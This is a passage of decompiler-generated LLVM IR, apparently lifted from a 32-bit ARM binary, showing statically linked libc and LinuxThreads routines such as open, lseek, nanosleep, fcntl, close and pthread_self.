  %stack_var_-12 = alloca i32, align 4
  %v2_1f24c = ptrtoint i32* %stack_var_-12 to i32
  %v3_1f254 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f24c)
  %v1_1f258 = call i32 @__libc_pause(i32 %v3_1f254)
  store i32 %v1_1f258, i32* @r4, align 4
  %v3_1f264 = load i32, i32* %stack_var_-12, align 4
  %v2_1f268 = trunc i32 %v3_1f264 to i8
  %v3_1f268 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f268, i32 0)
  %v0_1f26c = load i32, i32* @r4, align 4
  ret i32 %v0_1f26c
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1f28c = ptrtoint i32* %stack_var_-28 to i32
  %v3_1f294 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f28c)
  %v2_1f298 = ptrtoint i32* %stack_var_-4 to i32
  %v0_1f2a4 = load i32, i32* @r4, align 4
  store i32 %v0_1f2a4, i32* @r0, align 4
  %v5_1f2ac = call i32 @__libc_open64(i32 %v0_1f2a4, i32 %arg2, i32 %arg3, i32 %v2_1f298, i32 %v2_1f298)
  store i32 %v5_1f2ac, i32* @r4, align 4
  %v3_1f2b8 = load i32, i32* %stack_var_-28, align 4
  %v2_1f2bc = trunc i32 %v3_1f2b8 to i8
  %v3_1f2bc = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f2bc, i32 0)
  %v0_1f2c0 = load i32, i32* @r4, align 4
  ret i32 %v0_1f2c0

; uselistorder directives
  uselistorder i32 %v2_1f298, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @open(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1f2e4 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1f2ec = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f2e4)
  %v2_1f2f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1f2f0, i32* @r3, align 4
  store i32 %arg3, i32* @r2, align 4
  %v0_1f2fc = load i32, i32* @r4, align 4
  %v2_1f304 = call i32 @__GI_open(i32 %v0_1f2fc, i32 %arg2)
  store i32 %v2_1f304, i32* @r4, align 4
  %v3_1f310 = load i32, i32* %stack_var_-28, align 4
  %v2_1f314 = trunc i32 %v3_1f310 to i8
  %v3_1f314 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f314, i32 0)
  %v0_1f318 = load i32, i32* @r4, align 4
  ret i32 %v0_1f318

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @nanosleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1f32c = load i32, i32* @r4, align 4
  %v6_1f32c = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1f338 = load i32, i32* @r1, align 4
  store i32 %v0_1f338, i32* @r5, align 4
  %v2_1f340 = ptrtoint i32* %stack_var_-20 to i32
  %v3_1f344 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f340)
  %v0_1f348 = load i32, i32* @r5, align 4
  %v0_1f34c = load i32, i32* @r4, align 4
  %v2_1f350 = call i32 @__libc_nanosleep(i32 %v0_1f34c, i32 %v0_1f348)
  store i32 %v2_1f350, i32* @r4, align 4
  %v3_1f35c = load i32, i32* %stack_var_-20, align 4
  %v2_1f360 = trunc i32 %v3_1f35c to i8
  %v3_1f360 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f360, i32 0)
  %v0_1f364 = load i32, i32* @r4, align 4
  store i32 %v3_1f32c, i32* @r4, align 4
  store i32 %v6_1f32c, i32* @r5, align 4
  ret i32 %v0_1f364
}

define i32 @msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1f388 = ptrtoint i32* %stack_var_-20 to i32
  %v3_1f390 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f388)
  %v0_1f394 = load i32, i32* @r5, align 4
  %v0_1f39c = load i32, i32* @r4, align 4
  %v3_1f3a0 = call i32 @__libc_msync(i32 %v0_1f39c, i32 %v0_1f394, i32 %arg3)
  store i32 %v3_1f3a0, i32* @r4, align 4
  %v3_1f3ac = load i32, i32* %stack_var_-20, align 4
  %v2_1f3b0 = trunc i32 %v3_1f3ac to i8
  %v3_1f3b0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f3b0, i32 0)
  %v0_1f3b4 = load i32, i32* @r4, align 4
  ret i32 %v0_1f3b4
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v2_1f3d0 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  %v3_1f3e0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f3d0)
  %v0_1f3e8 = load i32, i32* @r4, align 4
  %v0_1f3ec = load i32, i32* @r5, align 4
  %v0_1f3f0 = load i32, i32* %r6.global-to-local, align 4
  %v5_1f3f8 = call i32 @__GI_lseek64(i32 %v0_1f3f0, i32 %arg4, i32 %v0_1f3e8, i32 %v0_1f3ec, i32 %arg4)
  store i32 %v5_1f3f8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v3_1f404 = load i32, i32* %stack_var_-20, align 4
  %v2_1f40c = trunc i32 %v3_1f404 to i8
  %v3_1f40c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f40c, i32 0)
  %v0_1f410 = load i32, i32* @r4, align 4
  ret i32 %v0_1f410

; uselistorder directives
  uselistorder i32 %arg4, { 2, 0, 1 }
}

define i32 @lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1f438 = ptrtoint i32* %stack_var_-20 to i32
  %v3_1f440 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f438)
  %v0_1f444 = load i32, i32* @r5, align 4
  %v0_1f44c = load i32, i32* @r4, align 4
  %v3_1f450 = call i32 @__libc_lseek(i32 %v0_1f44c, i32 %v0_1f444, i32 %arg3)
  store i32 %v3_1f450, i32* @r4, align 4
  %v3_1f45c = load i32, i32* %stack_var_-20, align 4
  %v2_1f460 = trunc i32 %v3_1f45c to i8
  %v3_1f460 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f460, i32 0)
  %v0_1f464 = load i32, i32* @r4, align 4
  ret i32 %v0_1f464
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1f47c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_1f488 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f47c)
  %v0_1f48c = load i32, i32* @r4, align 4
  %v1_1f490 = call i32 @__libc_fsync(i32 %v0_1f48c)
  store i32 %v1_1f490, i32* @r4, align 4
  %v3_1f49c = load i32, i32* %stack_var_-12, align 4
  %v2_1f4a0 = trunc i32 %v3_1f49c to i8
  %v3_1f4a0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f4a0, i32 0)
  %v0_1f4a4 = load i32, i32* @r4, align 4
  ret i32 %v0_1f4a4
}

define i32 @fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_1f4b4 = load i32, i32* @r3, align 4
  store i32 %v9_1f4b4, i32* %stack_var_-4, align 4
  %v3_1f4b8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1f4c4 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1f4cc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f4c4)
  %v2_1f4d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1f4d0, i32* @r3, align 4
  %v0_1f4dc = load i32, i32* @r4, align 4
  %v2_1f4e4 = call i32 @__libc_fcntl(i32 %v0_1f4dc, i32 %arg2)
  store i32 %v2_1f4e4, i32* @r4, align 4
  %v3_1f4f0 = load i32, i32* %stack_var_-28, align 4
  %v2_1f4f4 = trunc i32 %v3_1f4f0 to i8
  %v3_1f4f4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f4f4, i32 0)
  %v0_1f4f8 = load i32, i32* @r4, align 4
  store i32 %v3_1f4b8, i32* @r4, align 4
  ret i32 %v0_1f4f8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_1f50c = load i32, i32* @r4, align 4
  %v2_1f514 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_1f520 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1f514)
  %v0_1f524 = load i32, i32* @r4, align 4
  %v1_1f528 = call i32 @__GI_close(i32 %v0_1f524)
  store i32 %v1_1f528, i32* @r4, align 4
  %v3_1f534 = load i32, i32* %stack_var_-12, align 4
  %v2_1f538 = trunc i32 %v3_1f534 to i8
  %v3_1f538 = call i32 @__GI_pthread_setcanceltype(i8 %v2_1f538, i32 0)
  %v0_1f53c = load i32, i32* @r4, align 4
  store i32 %v3_1f50c, i32* @r4, align 4
  ret i32 %v0_1f53c

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 52, 53, 44, 45, 0, 1, 2, 3, 4, 5, 6, 7, 56, 57, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 34, 35, 40, 41, 20, 21, 22, 23, 36, 37, 54, 55, 48, 49, 46, 47, 50, 51, 24, 25, 26, 27, 38, 39, 28, 29, 42, 43, 30, 31, 32, 33 }
}

define i32 @__libc_current_sigrtmin(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_1f558 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 19288) to i32*), align 4
  ret i32 %v4_1f558
}

define i32 @__libc_current_sigrtmax(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_1f574 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 19292) to i32*), align 4
  ret i32 %v4_1f574
}

define i32 @__libc_allocate_rtsig(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v4_1f594 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 19288) to i32*), align 4
  store i32 %v4_1f594, i32* %r2.global-to-local, align 4
  %v1_1f598 = add i32 %v4_1f594, 1
  %v7_1f598 = icmp eq i32 %v1_1f598, 0
  br i1 %v7_1f598, label %dec_label_pc_1f5cc, label %dec_label_pc_1f5a0

dec_label_pc_1f5a0:                               ; preds = %entry
  %v4_1f5a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 19292) to i32*), align 4
  %v8_1f5ac = icmp sgt i32 %v4_1f594, %v4_1f5a4
  br i1 %v8_1f5ac, label %dec_label_pc_1f5cc, label %dec_label_pc_1f5b0

dec_label_pc_1f5b0:                               ; preds = %dec_label_pc_1f5a0
  %v2_1f5b0 = icmp eq i32 %arg1, 0
  br i1 %v2_1f5b0, label %.thread4, label %.thread

.thread:                                          ; preds = %dec_label_pc_1f5b0
  store i32 %v1_1f598, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 19288) to i32*), align 4
  br label %dec_label_pc_1f5d0

.thread4:                                         ; preds = %dec_label_pc_1f5b0
  store i32 %v4_1f5a4, i32* %r2.global-to-local, align 4
  %v2_1f5bc7 = add i32 %v4_1f5a4, -1
  store i32 %v2_1f5bc7, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 19292) to i32*), align 4
  br label %dec_label_pc_1f5d0

dec_label_pc_1f5cc:                               ; preds = %dec_label_pc_1f5a0, %entry
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f5d0

dec_label_pc_1f5d0:                               ; preds = %.thread, %.thread4, %dec_label_pc_1f5cc
  %v0_1f5d0 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_1f5d0

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder label %dec_label_pc_1f5d0, { 2, 1, 0 }
}

define i32 @function_1f5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1f5e0:
  %v0_1f5e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1f5e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1f5e0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1f5e0, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v9_1f5e8 = icmp eq i32 %arg1, %arg2
  %. = zext i1 %v9_1f5e8 to i32
  ret i32 %.
}

define i32 @__pthread_find_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_1f604 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v1_1f608 = add i32 %v4_1f604, 32
  store i32 %v1_1f608, i32* @r2, align 4
  %v1_1f60c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_1f618

dec_label_pc_1f614:                               ; preds = %dec_label_pc_1f624, %dec_label_pc_1f618
  %v1_1f614 = add i32 %v0_1f614, 16
  store i32 %v1_1f614, i32* @r2, align 4
  br label %dec_label_pc_1f618

dec_label_pc_1f618:                               ; preds = %entry, %dec_label_pc_1f614
  %v0_1f614 = phi i32 [ %v1_1f608, %entry ], [ %v1_1f614, %dec_label_pc_1f614 ]
  %v1_1f618 = add i32 %v0_1f614, 8
  %v2_1f618 = inttoptr i32 %v1_1f618 to i32*
  %v3_1f618 = load i32, i32* %v2_1f618, align 4
  %tmp4 = icmp ugt i32 %v1_1f60c, %v3_1f618
  br i1 %tmp4, label %dec_label_pc_1f614, label %dec_label_pc_1f624

dec_label_pc_1f624:                               ; preds = %dec_label_pc_1f618
  %v1_1f624 = add i32 %v0_1f614, 12
  %v2_1f624 = inttoptr i32 %v1_1f624 to i32*
  %v3_1f624 = load i32, i32* %v2_1f624, align 4
  %v3_1f628 = icmp ult i32 %v1_1f60c, %v3_1f624
  br i1 %v3_1f628, label %dec_label_pc_1f614, label %dec_label_pc_1f630

dec_label_pc_1f630:                               ; preds = %dec_label_pc_1f624
  ret i32 %v3_1f618

; uselistorder directives
  uselistorder i32 %v0_1f614, { 1, 2, 0 }
  uselistorder i32 %v1_1f60c, { 1, 0 }
  uselistorder label %dec_label_pc_1f618, { 1, 0 }
}

define i32 @_thread_self.3() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_1f648 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_1f64c = inttoptr i32 %v4_1f648 to i32*
  %v2_1f64c = load i32, i32* %v1_1f64c, align 4
  %v0_1f650 = load i32, i32* @sp, align 4
  %v3_1f650 = icmp ult i32 %v0_1f650, %v2_1f64c
  %v1_1f654 = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_1f650, label %dec_label_pc_1f660, label %dec_label_pc_1f68c

dec_label_pc_1f660:                               ; preds = %entry
  %v4_1f664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_1f668 = inttoptr i32 %v4_1f664 to i32*
  %v2_1f668 = load i32, i32* %v1_1f668, align 4
  %v3_1f66c = icmp ult i32 %v0_1f650, %v2_1f668
  br i1 %v3_1f66c, label %dec_label_pc_1f694, label %dec_label_pc_1f674

dec_label_pc_1f674:                               ; preds = %dec_label_pc_1f660
  %v4_1f678 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_1f67c = inttoptr i32 %v4_1f678 to i32*
  %v2_1f67c = load i32, i32* %v1_1f67c, align 4
  %v3_1f680 = icmp ult i32 %v0_1f650, %v2_1f67c
  br i1 %v3_1f680, label %dec_label_pc_1f68c, label %dec_label_pc_1f694

dec_label_pc_1f68c:                               ; preds = %dec_label_pc_1f674, %entry
  %v1_1f68c = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_1f674 ]
  %v3_1f68c = inttoptr i32 %v1_1f68c to i32*
  %v4_1f68c = load i32, i32* %v3_1f68c, align 4
  ret i32 %v4_1f68c

dec_label_pc_1f694:                               ; preds = %dec_label_pc_1f674, %dec_label_pc_1f660
  %v4_1f698 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_1f69c = inttoptr i32 %v4_1f698 to i32*
  %v2_1f69c = load i32, i32* %v1_1f69c, align 4
  %v2_1f6a0 = icmp eq i32 %v2_1f69c, 0
  br i1 %v2_1f6a0, label %dec_label_pc_1f6ac, label %dec_label_pc_1f6a8

dec_label_pc_1f6a8:                               ; preds = %dec_label_pc_1f694
  %v0_1f6a8 = call i32 @__pthread_find_self()
  %v0_1f6ac.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1f6ac

dec_label_pc_1f6ac:                               ; preds = %dec_label_pc_1f694, %dec_label_pc_1f6a8
  %v0_1f6ac = phi i32 [ %v1_1f654, %dec_label_pc_1f694 ], [ %v0_1f6ac.pre, %dec_label_pc_1f6a8 ]
  %v3_1f6ac = and i32 %v0_1f6ac, -2097152
  %v4_1f6ac = xor i32 %v3_1f6ac, -2097152
  %v1_1f6b4 = sub i32 -349, %v4_1f6ac
  %v1_1f6b8 = add i32 %v1_1f6b4, -3
  ret i32 %v1_1f6b8

; uselistorder directives
  uselistorder label %dec_label_pc_1f6ac, { 1, 0 }
}

define i32 @function_1f6c4(i16* %arg1) local_unnamed_addr {
dec_label_pc_1f6c4:
  %v0_1f6c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1f6c4, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_1f6c4
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_1f6c4
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__GI_pthread_self() local_unnamed_addr {
entry:
  %v0_1f6e4 = call i32 @_thread_self.3()
  %v1_1f6e8 = add i32 %v0_1f6e4, 16
  %v2_1f6e8 = inttoptr i32 %v1_1f6e8 to i32*
  %v3_1f6e8 = load i32, i32* %v2_1f6e8, align 4
  ret i32 %v3_1f6e8
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v1_1f6f8 = load i32, i32* @r0, align 4
  ret i32 %v1_1f6f8
}

define i32 @__pthread_setconcurrency(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38688) to i32*), align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_1f728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38688) to i32*), align 4
  ret i32 %v4_1f728
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %v3_1f738 = load i32, i32* @r4, align 4
  %v6_1f738 = load i32, i32* @r5, align 4
  %v12_1f738 = load i32, i32* @r7, align 4
  %v15_1f738 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v2_1f754 = ptrtoint i32* %stack_var_-328 to i32
  store i32 %v2_1f754, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v3_1f75c = call i32 @__sigsetjmp(i32* nonnull %stack_var_-328, i32 1)
  store i32 %v3_1f75c, i32* %r0.global-to-local, align 4
  store i32 %v3_1f75c, i32* %ip.global-to-local, align 4
  %v2_1f760 = icmp eq i32 %v3_1f75c, 0
  br i1 %v2_1f760, label %dec_label_pc_1f76c, label %.dec_label_pc_1f840_crit_edge

.dec_label_pc_1f840_crit_edge:                    ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %.pre = add i32 %arg1, 36
  %.pre4 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_1f840

dec_label_pc_1f76c:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @lr, align 4
  %v4_1f778 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 256) to i32*), align 4
  store i32 %v4_1f778, i32* %r2.global-to-local, align 4
  %v2_1f780 = add i32 %arg1, 36
  %v3_1f780 = inttoptr i32 %v2_1f780 to i32*
  store i32 %v2_1f754, i32* %v3_1f780, align 4
  %v0_1f784 = load i32, i32* %r2.global-to-local, align 4
  %v1_1f784 = inttoptr i32 %v0_1f784 to i32*
  %v2_1f784 = load i32, i32* %v1_1f784, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1f78c = ptrtoint i32* %stack_var_-32 to i32
  %v0_1f790 = load i32, i32* %ip.global-to-local, align 4
  %v2_1f790 = add i32 %arg1, 32
  %v3_1f790 = inttoptr i32 %v2_1f790 to i32*
  store i32 %v0_1f790, i32* %v3_1f790, align 4
  store i32 %v2_1f78c, i32* @r0, align 4
  %v0_1f79c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1f79c, i32* %stack_var_-32, align 4
  %v2_1f7a0 = call i32 @__GI_sigaddset(i32 %v2_1f78c, i32 %v2_1f784)
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1f7ac = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1f7ac, i32* %r2.global-to-local, align 4
  %v3_1f7b0 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1f78c, i32 %v2_1f7ac)
  store i32 %v3_1f7b0, i32* %r0.global-to-local, align 4
  store i32 1000000000, i32* @r7, align 4
  %v2_1f7b8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 1000, i32* @r5, align 4
  %v2_1f7c0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1f7c0, i32* @r4, align 4
  %v1_1f7dc = add i32 %tmp, 4
  %v2_1f7dc = inttoptr i32 %v1_1f7dc to i32*
  br label %dec_label_pc_1f7c4

dec_label_pc_1f7c4:                               ; preds = %dec_label_pc_1f820, %dec_label_pc_1f76c
  store i32 %v2_1f7b8, i32* %r0.global-to-local, align 4
  %v2_1f7cc = call i32 @gettimeofday(i32 %v2_1f7b8, i32 0)
  store i32 %v2_1f7cc, i32* %r0.global-to-local, align 4
  %v1_1f7d4 = load i32, i32* @r5, align 4
  %v2_1f7d4 = mul i32 %v1_1f7d4, %tmp6
  store i32 %v2_1f7d4, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %v3_1f7dc = load i32, i32* %v2_1f7dc, align 4
  %v2_1f7e0 = load i32, i32* %arg2, align 4
  store i32 %v2_1f7e0, i32* %ip.global-to-local, align 4
  %v2_1f7e4 = sub i32 %v3_1f7dc, %v2_1f7d4
  store i32 %v2_1f7e4, i32* %r2.global-to-local, align 4
  %v3_1f7e8 = load i32, i32* %stack_var_-48, align 4
  store i32 0, i32* @r1, align 4
  %v8_1f7f0 = icmp slt i32 %v2_1f7e4, 0
  %v2_1f7f4 = sub i32 %v2_1f7e0, %v3_1f7e8
  store i32 %v2_1f7f4, i32* %stack_var_-56, align 4
  br i1 %v8_1f7f0, label %bb23, label %bb

bb:                                               ; preds = %dec_label_pc_1f7c4
  br label %bb24

bb23:                                             ; preds = %dec_label_pc_1f7c4
  %v7_1f7fc = add i32 %v2_1f7f4, -1
  store i32 %v7_1f7fc, i32* %stack_var_-56, align 4
  %v7_1f80c = load i32, i32* @r7, align 4
  %v8_1f80c = add i32 %v7_1f80c, %v2_1f7e4
  store i32 %v8_1f80c, i32* %r2.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %bb, %bb23
  %v0_1f814 = phi i32 [ %v2_1f7f4, %bb ], [ %v7_1f7fc, %bb23 ]
  %v1_1f814 = icmp slt i32 %v0_1f814, 0
  store i32 %v2_1f7c0, i32* %r0.global-to-local, align 4
  br i1 %v1_1f814, label %dec_label_pc_1f82c, label %dec_label_pc_1f820

dec_label_pc_1f820:                               ; preds = %bb24
  %v1_1f820 = call i32 @nanosleep(i32 %v2_1f7c0)
  store i32 %v1_1f820, i32* %r0.global-to-local, align 4
  %v2_1f824 = icmp eq i32 %v1_1f820, 0
  br i1 %v2_1f824, label %dec_label_pc_1f82c, label %dec_label_pc_1f7c4

dec_label_pc_1f82c:                               ; preds = %dec_label_pc_1f820, %bb24
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1f838 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1f7ac, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1f840

dec_label_pc_1f840:                               ; preds = %.dec_label_pc_1f840_crit_edge, %dec_label_pc_1f82c
  %v3_1f848.pre-phi = phi i32* [ %.pre4, %.dec_label_pc_1f840_crit_edge ], [ %v3_1f780, %dec_label_pc_1f82c ]
  store i32 0, i32* %v3_1f848.pre-phi, align 4
  store i32 %v3_1f738, i32* @r4, align 4
  store i32 %v6_1f738, i32* @r5, align 4
  store i32 %v12_1f738, i32* @r7, align 4
  store i32 %v15_1f738, i32* @lr, align 4
  %v1_1f854 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1f854

; uselistorder directives
  uselistorder i32 %v2_1f7f4, { 1, 0, 2 }
  uselistorder i32 %v2_1f7b8, { 1, 0 }
  uselistorder i32 %v2_1f78c, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 2, 4, 3, 6, 5, 8, 7, 10, 12, 11, 0 }
  uselistorder i32 1000000000, { 1, 0 }
  uselistorder i32 (i32*, i32)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1f840, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
}

define i32 @function_1f85c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1f85c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1f85c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1f85c, label %bb, label %dec_label_pc_1f85c._crit_edge

dec_label_pc_1f85c._crit_edge:                    ; preds = %dec_label_pc_1f85c
  %v0_1f860.pre = load i1, i1* @cpsr_c, align 1
  br label %bb2

bb:                                               ; preds = %dec_label_pc_1f85c
  %v3_1f85c = and i32 %arg1, 1073741824
  %v4_1f85c = icmp ne i32 %v3_1f85c, 0
  %v5_1f85c = mul i32 %arg1, 4
  %v6_1f85c = and i32 %v5_1f85c, %arg1
  store i32 %v6_1f85c, i32* %r0.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_1f85c._crit_edge, %bb
  %v0_1f860 = phi i1 [ %v0_1f860.pre, %dec_label_pc_1f85c._crit_edge ], [ %v4_1f85c, %bb ]
  %v1_1f860 = xor i1 %v0_1f860, true
  call void @__pseudo_cond_branch(i1 %v1_1f860, i32 -26402712)
  %v2_1f860 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v2_1f860

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__pthread_restart_new() local_unnamed_addr {
entry:
